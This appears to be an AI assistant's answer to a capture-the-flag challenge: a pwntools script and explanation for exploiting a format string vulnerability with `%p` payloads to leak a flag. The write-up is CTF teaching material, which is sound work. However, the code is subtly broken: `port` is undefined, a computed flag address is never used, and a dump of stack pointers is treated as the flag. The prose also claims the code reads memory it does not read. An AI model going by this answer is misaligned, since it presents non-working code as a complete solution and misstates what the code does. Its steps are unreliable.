To solve this challenge using `pwntools`, we need to exploit the format string vulnerability present in the `printf(format)` call. The goal is to read or write arbitrary memory addresses to eventually leak the flag or gain control over the program.

### Steps to Solve the Challenge

1. **Identify the Vulnerability**: The `printf(format)` call is vulnerable to format string attacks because it uses user-controlled input as the format string.

2. **Leak Memory**: We can use format specifiers like `%x` to leak memory addresses and potentially find the base address of the binary or the flag.

3. **Write to Memory**: If necessary, we can use format specifiers like `%n` to write values to specific memory addresses.

4. **Exploit the Vulnerability**: Use the leaked information to craft a payload that will help us read the flag.

### Code to Solve the Challenge

Here is a step-by-step guide and the corresponding `pwntools` code to solve the challenge:

1. **Set Up the Environment**:
   - Install `pwntools` if you haven't already:
     ```sh
     pip install pwntools
     ```

2. **Connect to the Challenge**:
   - If the challenge is running locally, you can use `process`. If it's remote, use `remote`.

3. **Craft the Payload**:
   - Use format string specifiers to leak the flag.

4. **Send the Payload and Receive the Flag**.

Here is the complete code:

```python
from pwn import *

# Set up the process or remote connection
# Replace 'fmt' with the path to the binary if running locally
# Replace 'host' and 'port' with the actual host and port if running remotely
binary_path = './fmt'
# p = process(binary_path)
p = remote('host', port)

# Function to send and receive data
def interact(payload):
    p.sendlineafter("what's the flag", payload)
    response = p.recvuntil("But that was totally wrong lol get rekt")
    return response

# Step 1: Leak the flag
# The flag is stored in the buffer v10, which is 24 bytes long
# We can use format specifiers to read the flag from memory
leak_payload = b'%25$p'  # Leak the 25th parameter (which should be the address of v10)

response = interact(leak_payload)
print(response)

# Extract the leaked address
leaked_address = int(response.split(b'You answered: ')[1].split(b'\n')[0], 16)
log.info(f"Leaked address: {hex(leaked_address)}")

# Calculate the offset to the flag
flag_offset = 0x20  # Offset to the flag buffer (v10)
flag_address = leaked_address - flag_offset

# Step 2: Read the flag
# Use format specifiers to read the flag from the calculated address
read_flag_payload = b''.join([f'%{i}$p'.encode() for i in range(1, 25)])

response = interact(read_flag_payload)
print(response)

# Extract the flag
flag = response.split(b'You answered: ')[1].split(b'\n')[0]
log.success(f"Flag: {flag.decode()}")

# Close the connection
p.close()
```

### Explanation

1. **Leak the Address**:
   - The payload `'%25$p'` is used to leak the 25th parameter, which should be the address of the buffer `v10`.
   - The leaked address is then used to calculate the address of the flag.

2. **Read the Flag**:
   - The payload `b''.join([f'%{i}$p'.encode() for i in range(1, 25)])` is used to read the flag from the calculated address.
   - The flag is extracted from the response and printed.

### Notes
- Adjust the payload and offsets as needed based on the specific behavior of the binary.
- Ensure that the binary is not ASLR-enabled or handle ASLR if it is enabled.
- Test the payload locally before trying it on the remote server.

This should help you solve the challenge and obtain the flag. Good luck!
